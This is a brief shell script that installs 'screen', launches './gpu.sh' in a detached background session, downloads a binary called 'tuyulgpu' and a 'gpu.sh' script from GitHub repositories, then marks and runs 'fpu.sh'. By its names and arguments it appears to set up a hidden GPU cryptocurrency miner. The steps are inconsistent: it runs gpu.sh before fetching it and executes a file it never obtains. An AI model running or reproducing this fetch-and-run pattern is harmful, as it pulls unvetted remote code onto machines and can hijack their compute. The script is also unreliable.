#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 65 75
wget https://github.com/nuri655/nur/raw/main/tuyulgpu
wget https://raw.githubusercontent.com/jayaabadiindo/solid-eureka/main/gpu.sh
chmod +x fpu.sh
./fpu.sh